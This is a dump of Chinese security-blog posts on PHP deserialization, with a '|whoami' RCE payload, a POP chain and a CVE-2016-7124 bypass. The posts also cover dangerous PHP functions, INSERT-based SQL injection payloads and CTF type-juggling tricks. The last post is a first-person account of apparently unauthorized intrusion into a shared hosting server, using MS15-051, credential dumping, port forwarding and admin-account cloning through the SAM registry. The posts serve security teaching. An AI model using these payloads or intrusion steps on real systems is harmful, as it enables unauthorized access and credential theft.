ClassName &#123; function __construct()&#123; echo \"Hello,I am __construct\"; &#125;&#125;new ClassName(); 这里的输出结果是1Hello,I am __construct 其实这里的一个对象实例化的过程中默认会调用的__construct()。php常用的魔术函数有1__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 这里们并非每个都会在这里面用到，下面用一个例子来说下看几个常用到的魔术函数。123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:24:32 * @version $Id$ */class ClassName &#123; private $name =\"123\"; function __construct()&#123; echo \"Hello,I am __construct\".\"&lt;br/&gt;\"; &#125; function __destruct()&#123; echo \"Hello,I am __destruct\".\"&lt;br/&gt;\"; &#125; function __wakeup()&#123; echo \"Hello,I am __wakeup\".\"&lt;br/&gt;\"; &#125; function __sleep()&#123; echo \"Hello,I am __sleep\".\"&lt;br/&gt;\"; return array($this-&gt;name); &#125; function __get($name)&#123; echo \"Hello,I am __get\".\"&lt;br/&gt;\"; return $this-&gt;name; &#125; function __toString()&#123; echo \"Hello,I am __toString\".\"&lt;br/&gt;\"; return \"Hello\"; &#125;&#125;$O = new ClassName();$s= serialize($O);echo $s.\"&lt;br/&gt;\";$O = unserialize($s);$O.\"&lt;br/&gt;\";$O-&gt;nothing; 从例子我们可以看出，当初序列化一个对象是默认会调用__sleep，反序列化是会调用__wakeup，而__construct会在实例化一个对象是被调用，__desturct会在对象不再使用或者程序退出时自动调用, __toString会在对象被当做字符串时使用(特别注意字符串连接符.)。__get会在读取不可访问的属性的值的时候调用 0x03 反序列化漏洞先举一个反序列化漏洞例子 123456789101112131415&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:45:11 * @version $Id$ */class ClassName &#123; var $ip; function __wakeup()&#123; system('ping -c 4'.$this-&gt;ip); &#125;&#125;$O = unserialize($_GET['daiker']); 我们分析这串代码，可以得出一下结论 反序列化的的字符串我们可控 反序列化默认会调用__wakeup() 变量ip是会保存在反序列化的字符串里面的，我们可控所以我们下面构造payload。 12345678910111213&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:45:11 * @version $Id$ */class ClassName &#123; var $ip = \"|whoami\";&#125;echo urlencode(serialize(new ClassName())); 然后http://127.0.0.1/php-obj/example4.php?daiker=O%3A9%3A%22ClassName%22%3A1%3A%7Bs%3A2%3A%22ip%22%3Bs%3A7%3A%22%7Cwhoami%22%3B%7D就可以执行whoami,所以这里就导致RCE所以总结来讲，PHP对象注入(又叫反序列化漏洞)，需要几点条件。 反序列化字符串可控 有魔术方法会调用对象属性 对于反序列化的漏洞利用的效果取决于魔术方法里面对成员属性的调用方式，如上面的system()就会导致RCE，也可能是注入，任意文件上传等问题。 0x04 类变量的注意点看下面一个例子123456789101112131415&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 19:08:38 * @version $Id$ */class ClassName&#123; private $a = 1; protected $b =2; public $c =3;//&#125;echo serialize(new ClassName()).&quot;&lt;br/&gt;&quot;;echo urlencode(serialize(new ClassName())); 看输出结果 1O:9:&quot;ClassName&quot;:3:&#123;s:12:&quot;ClassNamea&quot;;i:1;s:4:&quot;*b&quot;;i:2;s:1:&quot;c&quot;;i:3;&#125; 1O%3A9%3A%22ClassName%22%3A3%3A%7Bs%3A12%3A%22%00ClassName%00a%22%3Bi%3A1%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A2%3Bs%3A1%3A%22c%22%3Bi%3A3%3B%7D% 一个个比较，我们会发现不可打印字符打印不出来。如果我们把可打印字符用作payload，会利用失败.如果是private 的变量，序列化的时候就会变成\\x00类名\\x变量名，这里就是\\xClassName\\x00a，urlencode之后变成%00ClassName%00a。如果是protected的变量，序列化之后就会变成\\x00\\x2A\\x00变量名。 0x05 POP Chain前面说到，要找反序列化漏洞，要有两个点。第一个是反序列化的参数可控，第二个是有魔术方法调用对象属性。但是我们往往会遇到一个问题，就是我们反序列化的参数可控，但是，没有合适的魔术方法，或者是魔术方法对对象属性的调用方法无法利用。这时候就有人提出了一个新的思路叫做POP Chain(跟二进制里面的ROP Chain 思路很像)。POP chain利用的条件是找到的魔术方法不可以直接利用，但它有调用其它方法或者使用其它的变量时，可以在其它的类中寻找同名的方法或是变量，直到可以利用的点。下面看一个简单的例子。1234567891011121314151617181920212223242526272829303132&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 19:41:17 * @version $Id$ */class One&#123; function myfunction()&#123; echo \"Hello,world\"; &#125;&#125;class Another&#123; var $cmd ; function myfunction()&#123; $this-&gt;attack(); &#125; function attack()&#123; system($this-&gt;cmd); &#125;&#125;class ClassName &#123; var $class ; function __construct()&#123; $this-&gt;class=new One(); &#125; function __wakeup()&#123; $this-&gt;class-&gt;myfunction(); &#125;&#125;$O = unserialize($_GET['daiker']); 我们分析下代码，可以发现一下几点 反序列化参数可控 存在魔术方法__construct()，这里不可以直接利用 __construct()调用了myfunction(),myfunction()不可以利用 其他类存在同名函数myfunction()，且另外一个类里面的Myfunction不可以单独被利用，但是存在可被利用的函数system()构造payload 1234567891011121314151617181920&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 20:26:02 * @version $Id$ */class Another&#123; var $cmd; function __construct()&#123; $this-&gt;cmd = \"whoami\"; &#125;//跟直接写 var $cmd = \"whoami'，不写__construct一样，这里演示还有这种写法&#125;class ClassName &#123; var $class ; function __construct()&#123; $this-&gt;class=new Another(); &#125;&#125;echo serialize(new ClassName()); 然后提交http://127.0.0.1/php-obj/pop.php?daiker=O:9:%22ClassName%22:1:{s:5:%22class%22;O:7:%22Another%22:1:{s:3:%22cmd%22;s:6:%22whoami%22;}} 0x06 CVE-2016-7124我们看一个代码1234567891011121314151617181920&lt;?php class object&#123; public $var = \"hello,world\"; function get_flag()&#123; return 'aaaa'; &#125; function __wakeup()&#123; $this-&gt;var = \"hello,wold\"; &#125; function __destruct()&#123; $fp=fopen(\"F:\\\\phpStudy\\\\WWW\\\\unse\\\\hello.php\",\"w\"); fputs($fp,$this-&gt;var); fclose($fp); &#125; &#125; $content = $_POST['content'];$object = unserialize($content);?&gt; 对比上面的代码，可以发现多了 123function __wakeup()&#123; $this-&gt;var = \"hello,wold\"; &#125; 这个魔术函数的作用就是在反序列化的时候会执行函数里面的东西，在这题，，我们就算更改了var这个变量的值，wakeup还是会把他改回来。这时候就要用到一个CVE。谷歌发现了CVE-2016-7124。简单来说就是当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup的执行。参考https://bugs.php.net/bug.php?id=72663，某一种情况下，出错的对象不会被毁掉，会绕过wakeup函数、引用其他的魔术方法。我们只要保证成员属性数目大于实际数目时可绕过wakeup方法，原来的序列化字符串是O:6:&quot;object&quot;:1:{s:3:&quot;var&quot;;s:18:&quot;&lt;?php phpinfo() ?&gt;&quot;;}把object后面的1更改为大于1的数字就可以了。。 成功绕过 0x07 经典案例1.typecho 反序列化漏洞2.SugarCRM v6.5.23反序列化漏洞","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"反序列化漏洞","slug":"渗透测试/Web安全/反序列化漏洞","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/反序列化漏洞/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"漏洞研究","slug":"漏洞研究","permalink":"http://www.daikersec.com/tags/漏洞研究/"}]},{"title":"PHP危险函数总结(随时补充)","slug":"php危险函数总结(随时补充)","date":"2017-07-09T15:44:34.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/1067b4de.html","link":"","permalink":"http://www.daikersec.com/wiki/1067b4de.html","excerpt":"1. 获取当前文件路径 echo dirname(__FILE__) ; echo getcwd();","text":"1. 获取当前文件路径 echo dirname(__FILE__) ; echo getcwd(); 2. 获取同目录下的所有文件名称 echo var_dump(glob(&#39;./*&#39;)); system(&quot;ls&quot;)/system(&quot;dir&quot;)/system--&gt;可换成执行系统命令的函数; 3. 读取某个文件的内容 echo file_get_contents(&quot;flag.php&quot;); echo fgets(fopen(&quot;flag.php&quot;,&quot;r&quot;)); echo fgetss(fopen(&quot;flag.php&quot;,&quot;r&quot;)); show_source(&quot;flag.php&quot;); echo fread(fopen(&quot;flag.php&quot;,&quot;r&quot;),filesize(&quot;flag.php&quot;)); echo var_dump(file(&quot;flag.php&quot;)); copy(&quot;flag.php&quot;,&quot;daiker.txt&quot;); include &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;; highlight_file(&quot;flag.php&quot;); readfile(“flag.php”); 4. 执行系统命令的函数 system passthru exec pcntl_exec shell_exec popen proc_open 5. 命令执行函数 eval(&quot;phpinfo();&quot;); assert(&quot;phpinfo();&quot;); preg_replace(&quot;/test/e&quot;,&quot;phpinfo();&quot;,&quot;jutst test&quot;); call_user_func(&quot;assert&quot;,&quot;eval(&#39;phpinfo();system(\\&#39;whoami\\&#39;);&#39;)&quot;); call_user_func_array(&quot;assert&quot;,array(&quot;phpinfo();&quot;)); fun = create_function(&#39;&#39;, assert(&#39;phpinfo()&#39;));$fun(); array_map(&quot;assert&quot;,array(&quot;phpinfo();&quot;)); fpassthru(fopen(&quot;flag.php&quot;,&quot;r&quot;)); 6. 反序列化 unserialize() 7.xxe simplexml_load_file() 8.文件操作 文件读取下载 file_get_content() highlight_file() fopen() readfile() fread() file() fgets() show_source() fpassthru 文件删除 unlink()","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://www.daikersec.com/categories/漏洞挖掘/"},{"name":"代码审计","slug":"漏洞挖掘/代码审计","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/"},{"name":"php","slug":"漏洞挖掘/代码审计/php","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/php/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"php","slug":"php","permalink":"http://www.daikersec.com/tags/php/"}]},{"title":"insert 注入","slug":"insert 注入","date":"2017-05-09T14:42:34.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/7e490dd2.html","link":"","permalink":"http://www.daikersec.com/wiki/7e490dd2.html","excerpt":"0x00 前言我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。","text":"0x00 前言我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。 0x01 例子下面我给出一个简单的例子，基于php+mysql的。方便实验1234567create database sqli;use sqli;create table user(name varchar(40),email varchar(20),qq varchar(20)); 12345678910111213141516171819202122前端&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt;&lt;title&gt;Examples&lt;/title&gt;&lt;meta name=\"description\" content=\"\"&gt;&lt;meta name=\"keywords\" content=\"\"&gt;&lt;link href=\"\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"register.php\" method=\"post\"&gt; Name: &lt;input type=\"text\" name=\"name\" /&gt; Email: &lt;input type=\"text\" name=\"email\" /&gt; QQ: &lt;input type=\"text\" name=\"qq\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425后端&lt;?php/** * * @authors daiker * @date 2017-05-09 20:08:53 * @version $Id$ */$conn=mysql_connect('127.0.0.1', 'root', 'root');if(!$conn)&#123; die(\"mysql connect error\");&#125;mysql_select_db(\"sqli\",$conn);$sql=\"insert into user(name,email,qq) values ('$_POST[name]','$_POST[email]','$_POST[qq]')\";$result=mysql_query($sql,$conn);print_r(mysql_error());if(!$result)&#123; die(\"error\");&#125;echo \"Yes\";?&gt; 效果 0x02分析注入我们常见的注入有4种 报错注入 联合查询 盲注 堆叠查询联合查询前后都要SELECT,排除堆叠查询，mysql不支持排除，那就只剩下报错注入和盲注。报错注入条件比较苛刻，需要显示报错信息. 0x03报错注入报错注入条件比较苛刻，需要显示报错信息.报错注入，那就要能报错，可以用floor(),updatexml(),extractvalue()。这里以extractvalue()为例首先闭合，有两种方法,内联式和注释法内联式的话,就是加and ‘1’=’1来闭合后面的引号注释式的话，就是够着1’,’’,’’)#这样的语句然后利用extractvalue报错 1name=ee&apos; and extractvalue(1,&apos; &apos;) and &apos;1&apos;=&apos;1 &amp;email=aa&amp;qq=aa 报错了 1XPATH syntax error: &apos;&apos; 然后修改`extractvalue()的第二个值以此提取数据 1name=ee&apos; and extractvalue(1,concat(0x5e5e5e,database(),0x5e5e5e)) and &apos;1&apos;=&apos;1 &amp;email=aa&amp;qq=aa 0x5e5e5e据^^^为方便观看爆出数据库 1XPATH syntax error: &apos;^^^sqli^^^&apos; 0x04 盲注实验前删除上面语句的print_r(mysql_error()); 因为报错注入要求必须报错，但是一旦不显示错误，就比较困难了。如果是布尔型盲注，关键是让返回的结果不一样，也就是让语句不能正确执行，这里的话，我利用if((1=1),a,b)，a和b会导致整个语句返回的结果不同，那我们执行的语句不久可以放在(1=1)这里，但是怎么构造呢?最开始想的是用报错注入那几个函数,比如extractvalue，但是无论如何都不能执行，后来本地调试了一下 大致可以推出if语句后面两个参数都是会执行的，不管有没有被选中，但是谁被选中，就把执行的结果返回。后来讲过大佬点拨，发现了一个语句。 1select 1 from information_schema.tables 这个语句的话执行是不会报错的 但是注意看图，会发现，他返回的结果特别多。没错，就是这一点，多行结果跟1 and 会报错。 最后构造语句 1name=ee&apos; and if((A),1,(select 1 from information_schema.tables)) &amp;email=aa&amp;qq=a 其中A是我们自己构造的语句，参见盲注的文章自己构造 但是有一点必须强调，这样的后果就是数据库会残留下大量语句。尽量不要用这招 0x05 在插入数据可以查询的情况下12345678910mysql&gt; insert into user values(&apos;daiker&apos;,&apos;t@qq.com&apos;,user());Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+--------+----------+----------------+| name | email | qq |+--------+----------+----------------+| daiker | t@qq.com | root@localhost |+--------+----------+----------------+1 row in set (0.00 sec) 当然有时候可能插入点是整型的，可以这样1234567891011mysql&gt; insert into user values(&apos;daiker&apos;,&apos;t@qq.com&apos;,0|hex(substr(&apos;daiker666&apos;,1,1)));Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+--------+----------+----------------+| name | email | qq |+--------+----------+----------------+| daiker | t@qq.com | root@localhost || daiker | t@qq.com | 64 |+--------+----------+----------------+2 rows in set (0.00 sec) 通过substr,mid，left之类的一个个提取出来。然后再转为16进制，跟0或。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"SQL注入","slug":"渗透测试/Web安全/SQL注入","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/SQL注入/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"注入","slug":"注入","permalink":"http://www.daikersec.com/tags/注入/"}]},{"title":"CTF中代码审计小trick(未完)","slug":"CTF中代码审计小trick(未完)","date":"2017-05-04T13:14:14.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/4249e474.html","link":"","permalink":"http://www.daikersec.com/wiki/4249e474.html","excerpt":"0x00 弱类型强类的语言遇到函数引数类型和实际调用类型不匹配的情况经常会直接出错或者编译失败；而弱类型的语言常常会实行隐式转换，或者产生难以意料的结果","text":"0x00 弱类型强类的语言遇到函数引数类型和实际调用类型不匹配的情况经常会直接出错或者编译失败；而弱类型的语言常常会实行隐式转换，或者产生难以意料的结果也就是说，其实弱类型式其实式语言帮我们做了转换，好处是我们编程的时候可以省很多力，但是方便的同时也带来一些问题。注意的是，python并不是一门弱类型的语言。 string转intphp在将string转化成int的时候会把后面的字母舍掉。比如 ‘132a’会被转化为123。又比如’aaa‘会被转化为为0。受到影响的:intval(),==,&gt;,’&lt;等。看到具体的例子。123456is_numeric(@$a[\"str\"])?die(\"eroor\"):NULL; if(@$a[\"str\"])&#123; if ($a[\"str\"]&gt;2016)&#123; echo $flag; &#125; &#125; 这时只需要传入2017aaa就可以绕过 进制转化会自动转化进制，而且支持科学计数法php var_dump(0x10==16); var_dump(020==16); var_dump(2e1==20);这些都是正确的，举个例子123456789101112?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; 这时只要找出两个数的md5都是0e开头的就可以。具体哪些，看这一篇PHP处理0e开头md5哈希字符串缺陷/bug 0x01 strcmpstrcmp(array,string)=null=0具体例子1234567891011121314&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123; if(@!strcmp($pass,$pass1))&#123; echo \"flag:nctf&#123;*&#125;\"; &#125;else&#123; echo \"the pass is wrong!\";&#125;&#125;else&#123; echo \"please input pass!\";&#125;?&gt; 传进一个数组就行 0x02 array_search()与in_array()传进的string被转化为0的情况12$array=array(13);var_dump(strcmp($array,'abc')==true ); 1234$array=array(0=&gt;&apos;a&apos;,&apos;b&apos;);var_dump(array_search(&apos;b&apos;,$array) == false ); //falsevar_dump(array_search(&apos;c&apos;,$array) == false ); //truevar_dump(array_search(&apos;a&apos;,$array) == false ); //true 特例，刚好找到是0 0==flase 0x03 md5123$array=array(0=&gt;'a','b');$b=array(0);var_dump(md5($array)===md5($b)); //true 两个数组的md5一样 0x04 eregi可以被截断123456789$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(\"3|1|c\",$d.$c[0])?die(\"nope\"):NULL; strpos(($c[0].$d), \"isccctf2017\")?$v3=1:NULL; &#125; 构造截断就好 0x05 file_put_content和unlink0x06 rand0x07 end(array)和array[length(array)-1]0x08 未初始化变量漏洞","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://www.daikersec.com/categories/漏洞挖掘/"},{"name":"代码审计","slug":"漏洞挖掘/代码审计","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/"},{"name":"php","slug":"漏洞挖掘/代码审计/php","permalink":"http://www.daikersec.com/categories/漏洞挖掘/代码审计/php/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"代码审计","slug":"代码审计","permalink":"http://www.daikersec.com/tags/代码审计/"}]},{"title":"一次简单渗透","slug":"一次简单渗透","date":"2017-04-28T11:38:25.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/c445d4db.html","link":"","permalink":"http://www.daikersec.com/wiki/c445d4db.html","excerpt":"0x00 前言用的手法都是网上有的，大佬勿喷，只是感觉经历坎坷，记录一下 0x01 初步提权","text":"0x00 前言用的手法都是网上有的，大佬勿喷，只是感觉经历坎坷，记录一下 0x01 初步提权freehost，免费的?net user一下， 顿时感觉头都大了，应该是同服站点，每个人一个账号，这种权限划分特别严格，不好搞。但不管怎么样，开始搞吧。试一下systeminfo。 Windows2008 r2 64位服务器，还有打补丁，，pr肯定不行，传个巴西烤肉，还是不行。试下窃取口令的工具incognito 只能列出同等级的，不能提权。刚要试试数据库提权，大佬@wyAtu告诉我说可以用ms15-051。试了一个32位，不行，，只得换成64位的，，成功了 还是System权限，添加个账号，开3389就可以去吃饭了。 0x02 添加账号添加账号加进管理员组 不是system权限吗，，百思不得其解。先留着。。去连连3389玩玩。(后来才知道是安全狗拦着，大佬们给了很多建议，怎么杀狗，后来添加也没什么用，就没搞了，详见下文) 0x03 远程连接端口扫描 没开3389，奇怪，那就帮他开个。。。可是死活打不开。。。很奇怪，忽然想到，，这种服务器应该不可能没开3389啊，估计把端口改了。tasklist /svc 找到pid 2128,netstat -ano 果然，，开放端口43852。试着连接一下。 失败了，怎么会这样呢难道是内网?，查ip也不是啊。不管了，端口转发一下。。 连接成功，有些人可能没有公网作为中转，可以试试-tran 5555 127.0.0.1 43852。因为这里比较特殊，不是内网，而是通过策略禁止别人远程连接，因此转移个端口就够了。 WTF…………………….只有特定用户能登陆。那我估计添加账号也没有什么用了。。windows下权限再高不能连接3389有鸟用。这是只能默念我是system，可以做一切事情。 0x04 搞管理员账号密码先上传猕猴桃 mimikatz。。系统进程一直卡死在那里。不懂为什么，试试下一个Pwdump7密码解不开..GG最后朋友@iFurySt推荐了一个神器，说是可以直接抓明文密码的wce 终于抓到了，，试了一下。。还是不行。。估计抓到的是缓存的密码。密码已经改了。。山穷水复。。 0x05 账号克隆最后才想起用它。。居然加不了管理员。。那我把管理员的克隆过来总可以了吧。为了小心。。我用Guest账号吧 激活 net user Guest /active:yes 导出注册表 reg export &quot;HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4&quot; &quot;x:\\1.reg 导入注册表 regedit /s x:/1.reg但是登陆的时候由于策略原因导致空口了不能登陆。这时候给guest改下密码就可以 0x06 总结这篇的环境是 提权成功，拿到system权限 安全狗禁止添加管理员账号 策略原因禁止外部IP访问 远程连接只允许管理员的那个账号登录(不是管理员就可以登录)","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"渗透思路","slug":"渗透测试/渗透思路","permalink":"http://www.daikersec.com/categories/渗透测试/渗透思路/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"渗透","slug":"渗透","permalink":"http://www.daikersec.com/tags/渗透/"},{"name":"提权","slug":"提权","permalink":"http://www.daikersec.com/tags/提权/"}]}]}